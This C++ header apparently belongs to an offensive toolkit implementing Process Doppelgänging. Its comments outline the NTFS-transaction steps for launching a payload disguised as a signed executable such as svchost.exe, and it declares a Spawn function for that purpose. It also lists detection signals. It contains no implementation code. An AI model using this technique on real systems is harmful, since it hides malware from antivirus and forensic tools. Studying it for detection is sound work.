#pragma once
#ifndef DOPPELGANG_H
#define DOPPELGANG_H
#include "common.h"

// Doppelgänging — Process Doppelgänging (T1055.013).
//
// Discovered by enSilo (2017). Uses NTFS Transactional File System (TxF) to
// create a process whose on-disk image NEVER matches its in-memory image.
//
// Technique:
//   1. NtCreateTransaction — start a TxF transaction
//   2. CreateFileTransactedA — open/create a file WITHIN the transaction
//   3. Write a modified PE (or our payload) into the transacted file
//   4. NtCreateSection(SEC_IMAGE) — create an image section from the transacted file
//   5. NtRollbackTransaction — roll back, so the file on disk reverts
//   6. NtCreateProcessEx — create a process from the section (payload image)
//   7. NtCreateThreadEx — create the main thread
//
// Result: a running process whose on-disk file is the ORIGINAL (legitimate) file.
// Any forensic tool that checks "process image vs disk" will see a mismatch that
// many AV products treat as clean because the disk file IS clean.
//
// What a strong detector still catches:
//   - NtCreateTransaction + NtCreateSection(SEC_IMAGE) in sequence = high signal
//   - MDE / Defender Advanced Hunting: Process Memory Content scan (in-memory PE scan)
//   - The EPROCESS.ImageFileName still shows the transacted file path
//   - Windows 10 1903+ has mitigations that increase detection likelihood
//   - Sysmon EID 1 (process create) still fires, just with misleading image path
//
// MITRE T1055.013 — Process Doppelgänging

namespace Doppelgang {
    // Run `payloadPath` PE as a doppelgänged process masquerading as `hostPath`.
    // hostPath: a legitimate signed executable to use as the disk "cover"
    //           (e.g. C:\Windows\System32\svchost.exe)
    // payloadPath: the real PE to run (written transiently into the transaction)
    // Returns PID of doppelgänged process, or 0 on failure.
    DWORD Spawn(const char* hostPath, const char* payloadPath);

    // Check if TxF is available on the current OS (disabled on Server Core).
    bool IsTxFAvailable();

    // Diagnostic: report what TxF APIs are present.
    std::string CheckAvailability();
}

#endif
